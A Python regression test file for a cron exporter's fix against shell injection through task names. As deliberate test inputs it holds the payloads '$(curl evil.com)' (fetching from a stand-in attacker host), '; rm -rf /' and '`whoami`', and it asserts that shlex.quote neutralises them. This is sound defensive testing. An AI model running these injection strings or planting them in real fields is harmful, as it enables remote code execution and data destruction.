"""Regression tests for the scheduler-side Phase-3 audit findings.

Brain-side fixes are pinned in
``packages/z4j/backend/tests/unit/test_audit_phase3_fixes.py``.

Scheduler-side fix:

- **MED-1**: cron exporter didn't shell-escape ``task_name``. An
  attacker who could plant a schedule named with shell metachars
  (e.g. ``"$(curl evil.com)"``) would get RCE when the operator
  exported and ran the resulting crontab. Fix: ``shlex.quote``
  every task_name in the rendered output.
"""

from __future__ import annotations

from z4j_scheduler.exporters import cron
from z4j_scheduler.exporters._client import ExportedSchedule


def _evil_schedule() -> ExportedSchedule:
    return ExportedSchedule(
        id="00000000-0000-0000-0000-000000000001",
        name="evil",
        engine="celery",
        kind="cron",
        expression="0 * * * *",
        # Classic shell-injection payload. If the export doesn't
        # quote, the cron line becomes a command-substitution that
        # the WRAPPER's shell evaluates at fire time.
        task_name="$(curl evil.com)",
        timezone="UTC",
    )


class TestCronExporterShellSafe:
    def test_dangerous_task_name_is_quoted(self) -> None:
        out = cron.render([_evil_schedule()])
        # The dangerous unquoted form must NOT appear.
        assert "$WRAPPER $(curl evil.com)" not in out
        # The quoted form must appear (shlex.quote wraps in single
        # quotes and escapes embedded single quotes).
        assert "$WRAPPER '$(curl evil.com)'" in out

    def test_benign_task_name_still_works(self) -> None:
        # Make sure shlex.quote doesn't mangle plain names.
        sched = ExportedSchedule(
            id="x",
            name="ok",
            engine="celery",
            kind="cron",
            expression="0 * * * *",
            task_name="myapp.tasks.heartbeat",
        )
        out = cron.render([sched])
        # Plain names contain only [a-zA-Z0-9._-] - shlex.quote
        # leaves them unquoted.
        assert "$WRAPPER myapp.tasks.heartbeat" in out

    def test_disabled_row_also_quotes_task_name(self) -> None:
        sched = ExportedSchedule(
            id="x",
            name="off",
            engine="celery",
            kind="cron",
            expression="0 * * * *",
            task_name="; rm -rf /",
            is_enabled=False,
        )
        out = cron.render([sched])
        # The actual cron-line (the one the operator might uncomment)
        # must be shell-safe. The leading "# DISABLED..." header
        # text is inert because cron treats `#` as a line comment;
        # the dangerous payload is fine to appear there.
        assert "$WRAPPER ';" in out  # quoted in the cron line
        assert "$WRAPPER ;" not in out  # raw form NOT in the cron line

    def test_interval_row_also_quotes_task_name(self) -> None:
        sched = ExportedSchedule(
            id="x",
            name="poll",
            engine="celery",
            kind="interval",
            expression="5m",
            task_name="`whoami`",
        )
        out = cron.render([sched])
        # Backtick command substitution is also dangerous.
        assert "$WRAPPER `whoami`" not in out
        assert "$WRAPPER '`whoami`'" in out

    def test_source_uses_shlex_quote(self) -> None:
        # Pin the implementation so a future refactor can't drop
        # the quoting silently.
        import inspect

        source = inspect.getsource(cron)
        assert "shlex" in source
        assert "shlex.quote" in source
